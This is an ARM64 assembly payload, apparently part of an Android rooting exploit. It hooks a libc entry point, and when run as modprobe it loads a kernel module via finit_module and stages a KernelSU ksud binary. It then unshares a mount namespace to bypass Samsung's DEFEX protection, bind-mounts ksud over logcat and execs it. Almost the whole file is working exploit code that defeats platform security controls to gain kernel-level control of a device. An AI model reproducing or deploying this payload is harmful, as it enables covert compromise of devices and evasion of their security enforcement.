    .arch armv8-a

    .include "include.inc"

    .global libc_start
    .global libc_data
    .global libc_len
    .global libc_first_inst_copy
    .data

libc_data:
executable_path:
    .asciz "/vendor/bin/modprobe"
lib_path:
    .asciz "/vendor/lib64/libstagefrighthw.so"
mod_args:
    .asciz ""
ksud_path:
    .asciz "/dev/.ksud"
ksud_staged_path:
    .asciz "/data/system/ksud"
logcat_path:
    .asciz "/system/bin/logcat"
root_path:
    .asciz "/"
mark_modprobe:
    .asciz "/dev/dfm1"
mark_bind_ns:
    .asciz "/dev/dfm2"
mark_bind_ok:
    .asciz "/dev/dfm3"
mark_exec_fail:
    .asciz "/dev/dfm4"
mark_ksud_ok:
    .asciz "/dev/dfm6"
    .global libc_ksud_proc_path_off
libc_ksud_proc_path_off:
    .int s2_ksud_proc_path - libc_data
s2_ksud_proc_path:
    .space 64

argv_prog:
    .asciz "logcat"
argv_late:
    .asciz "late-load"
argv_pkgname:
    .asciz "--package-name"
argv_ksu:
    .asciz "me.weishu.kernelsu"
argv_stage_from:
    .asciz "--stage-from"
argv_ro_partitions:
    .asciz "--ro-partitions"
argv_soft_reboot:
    .asciz "--soft-reboot"

// EVIOCGKEY(96): _IOC(IOC_READ=2, 'E', 0x18, 96) = 0x80604518
.equ EVIOCGKEY_96, 0x80604518

// Null-terminated list of input device paths to scan for KEY_VOLUMEDOWN.
event_path_table:
    .asciz "/dev/input/event0"
    .asciz "/dev/input/event1"
    .asciz "/dev/input/event2"
    .asciz "/dev/input/event3"
    .asciz "/dev/input/event4"
    .asciz "/dev/input/event5"
    .asciz "/dev/input/event6"
    .asciz "/dev/input/event7"
    .asciz "/dev/input/event8"
    .asciz "/dev/input/event9"
    .asciz "/dev/input/event10"
    .asciz "/dev/input/event11"
    .asciz "/dev/input/event12"
    .asciz "/dev/input/event13"
    .asciz "/dev/input/event14"
    .byte 0

    .balign 4
    .global libc_skip_soft_reboot_off
libc_skip_soft_reboot_off:
    .int libc_skip_soft_reboot_flag - libc_data
libc_skip_soft_reboot_flag:
    .byte 0

    .align 4

libc_start:
    stp x0, x1, [sp, #-16]!
    stp x2, x3, [sp, #-16]!
    stp x4, x5, [sp, #-16]!
    stp x6, x7, [sp, #-16]!
    stp x8, x9, [sp, #-16]!
    stp x26, x27, [sp, #-16]!
    stp x28, x29, [sp, #-16]!
    str x30, [sp, #-16]!

    // x0 -> int argc
    ldr     w1, [x0]            // w1 = argc
    cbz     w1, matched      // argc == 0, just go ahead

    // assume argv is 8-byte aligned, right after argc
    // i.e. layout: int argc; int pad; char *argv[argc];
    add     x2, x0, #8
    ldr     x3, [x2]            // x3 = argv[0]
    cbz     x3, return_now

    adr     x4, executable_path // x4 = expected path

strcmp_loop:
    ldrb    w5, [x3], #1
    ldrb    w6, [x4], #1
    cmp     w5, w6
    b.ne    return_now
    cbnz    w5, strcmp_loop     // not at '\0' yet, keep comparing

matched:
    // argv[0] == executable_path

    create_mark mark_modprobe

    // open lib
    mov     x0, -100
    adr     x1, lib_path
    mov    x2, O_RDONLY
    mov     x8, #SYS_openat
    svc     0
    mov     x26, x0         // save lib fd

    // finit_module
    adr x1, mod_args
    mov x2, xzr
    mov x8, #SYS_finit_module
    svc 0

    // close lib fd
    mov     x0, x26
    mov     x8, #SYS_close
    svc     0

    // Copy ksud from memfd to /dev/.ksud (bind mount target) and /data/system/ksud (--stage-from).
    sub  sp, sp, #272

    create_mark s2_pre_mark

    mov  x0, -100
    adr  x1, s2_ksud_proc_path
    mov  x2, O_RDONLY
    mov  x3, xzr
    mov  x8, #SYS_openat
    svc  0
    tbnz w0, #31, s2_cp_open_fail
    str  w0, [sp, 0]

    // copy 1: memfd -> /dev/.ksud (bind mount target)
    mov  x0, -100
    adr  x1, s2_dst_path
    movl x2, (O_WRONLY|O_CREAT|O_TRUNC|O_CLOEXEC)
    mov  x3, 0755
    mov  x8, #SYS_openat
    svc  0
    tbnz w0, #31, s2_cp2_start
    str  w0, [sp, 4]
s2_cp1_loop:
    ldr  w0, [sp, 0]
    add  x1, sp, 16
    mov  x2, 256
    mov  x8, #SYS_read
    svc  0
    cmp  x0, 0
    ble  s2_cp1_close_dst
    mov  x2, x0
    ldr  w0, [sp, 4]
    add  x1, sp, 16
    mov  x8, #SYS_write
    svc  0
    b    s2_cp1_loop
s2_cp1_close_dst:
    ldr  w0, [sp, 4]
    mov  x8, #SYS_close
    svc  0
    // seek src back to 0 for second copy
    ldr  w0, [sp, 0]
    mov  x1, xzr
    mov  x2, xzr
    mov  x8, #SYS_lseek
    svc  0

    // copy 2: memfd -> /data/system/ksud (--stage-from target)
s2_cp2_start:
    mov  x0, -100
    adr  x1, s2_dst2_path
    movl x2, (O_WRONLY|O_CREAT|O_TRUNC|O_CLOEXEC)
    mov  x3, 0755
    mov  x8, #SYS_openat
    svc  0
    tbnz w0, #31, s2_cp_src_close
    str  w0, [sp, 4]
s2_cp2_loop:
    ldr  w0, [sp, 0]
    add  x1, sp, 16
    mov  x2, 256
    mov  x8, #SYS_read
    svc  0
    cmp  x0, 0
    ble  s2_cp2_close_dst
    mov  x2, x0
    ldr  w0, [sp, 4]
    add  x1, sp, 16
    mov  x8, #SYS_write
    svc  0
    b    s2_cp2_loop
s2_cp2_close_dst:
    ldr  w0, [sp, 4]
    mov  x8, #SYS_close
    svc  0
    b    s2_cp_src_close

s2_cp_open_fail:
    create_mark s2_fail_mark
    b    s2_cp_done

s2_cp_src_close:
    ldr  w0, [sp, 0]
    mov  x8, #SYS_close
    svc  0

s2_cp_done:
    add  sp, sp, #272
    b    s2_copy_strs_end
    .balign 4
s2_dst_path:
    .asciz "/dev/.ksud"
    .balign 4
s2_dst2_path:
    .asciz "/data/system/ksud"
    .balign 4
s2_pre_mark:
    .asciz "/dev/dfm0"
    .balign 4
s2_fail_mark:
    .asciz "/dev/dfmf"
    .balign 4
s2_copy_strs_end:

    sub sp, sp, 80

    // Bypass DEFEX by bind mount.
    movl x0, (CLONE_NEWNS)
    mov x8, #SYS_unshare
    svc 0
    cbnz w0, myexit

    // mount(NULL, "/", NULL, MS_REC|MS_PRIVATE, NULL)
    mov x0, xzr
    adr x1, root_path
    mov x2, xzr
    movl x3, (MS_REC | MS_PRIVATE)
    mov x4, xzr
    mov x8, #SYS_mount
    svc 0
    cbnz w0, myexit

    create_mark mark_bind_ns

    // mount(ksud_path, logcat_path, NULL, MS_BIND, NULL)
    adr x9, ksud_path
    mov x0, x9
    adr x1, logcat_path
    mov x2, xzr
    mov x3, MS_BIND
    mov x4, xzr
    mov x8, #SYS_mount
    svc 0
    cbnz w0, myexit

    create_mark mark_bind_ok

    // If libc_skip_soft_reboot_flag=1 (button path), skip vol scan and omit --soft-reboot.
    // If 0 (boot receiver path), scan /dev/input/event* for KEY_VOLUMEDOWN via EVIOCGKEY.
    // x26=1: omit --soft-reboot; x26=0: include it.
    mov     x26, xzr
    adr     x9, libc_skip_soft_reboot_flag
    ldrb    w9, [x9]
    cbnz    w9, vol_scan_skip
    adr     x27, event_path_table
    sub     sp, sp, #96
vol_scan_loop:
    ldrb    w0, [x27]
    cbz     w0, vol_scan_done
    mov     x0, -100
    mov     x1, x27
    movl    x2, O_CLOEXEC
    mov     x3, xzr
    mov     x8, #SYS_openat
    svc     0
    tbnz    w0, #31, vol_scan_next
    mov     x28, x0
    mov     x0, x28
    movl    x1, EVIOCGKEY_96
    mov     x2, sp
    mov     x8, #SYS_ioctl
    svc     0
    tbnz    w0, #31, vol_close
    ldrb    w0, [sp, #14]       // KEY_VOLUMEDOWN=114: byte=114/8=14, bit=114%8=2
    tst     w0, #4
    b.eq    vol_close
    mov     x26, #1
vol_close:
    mov     x0, x28
    mov     x8, #SYS_close
    svc     0
    cbnz    x26, vol_scan_done
vol_scan_next:
    ldrb    w0, [x27], #1
    cbnz    w0, vol_scan_next
    b       vol_scan_loop
vol_scan_done:
    add     sp, sp, #96
    b       vol_build_argv
vol_scan_skip:
    mov     x26, #1
vol_build_argv:

    // argv = [logcat, late-load, --package-name,
    //         me.weishu.kernelsu, --stage-from, ksud_staged_path, [--soft-reboot,] NULL]
    adr x0, argv_prog
    str x0, [sp]

    adr x0, argv_late
    str x0, [sp, 8]

    adr x0, argv_pkgname
    str x0, [sp, 16]

    adr x0, argv_ksu
    str x0, [sp, 24]

    adr x0, argv_stage_from
    str x0, [sp, 32]

    adr x0, ksud_staged_path
    str x0, [sp, 40]

    adr x0, argv_ro_partitions
    str x0, [sp, 48]

    cbnz    x26, vol_no_softreboot
    adr     x0, argv_soft_reboot
    str     x0, [sp, 56]
    b       vol_do_fork
vol_no_softreboot:
    str     xzr, [sp, 56]
vol_do_fork:

    // fork: child execve's ksud; parent marks success and exits
    movl x0, SIGCHLD
    mov x1, xzr
    mov x2, xzr
    mov x3, xzr
    mov x4, xzr
    mov x8, #SYS_clone
    svc 0
    str x0, [sp, 64]    // child: 0 (64-bit NULL terminator); parent: child pid (branches away)
    cbnz w0, s2_wait_ksud

    // child: execve ksud (bind-mounted over logcat)
    adr x0, logcat_path
    mov x1, sp
    mov x2, xzr
    mov x8, #SYS_execve
    svc 0

    create_mark mark_exec_fail
    mov x0, #1
    mov x8, #SYS_exit
    svc #0

s2_wait_ksud:
    create_mark mark_ksud_ok

myexit:
    mov x0, #1
    mov x8, #SYS_exit
    svc #0

return_now:
    ldr x30, [sp], #16
    ldp x28, x29, [sp], #16
    ldp x26, x27, [sp], #16
    ldp x8, x9, [sp], #16
    ldp x6, x7, [sp], #16
    ldp x4, x5, [sp], #16
    ldp x2, x3, [sp], #16
    ldp x0, x1, [sp], #16
libc_first_inst_copy:
    stp x29, x30, [sp, #-0x30]!
    b end2
end2:

libc_end:
libc_len:
    .word libc_end - libc_data
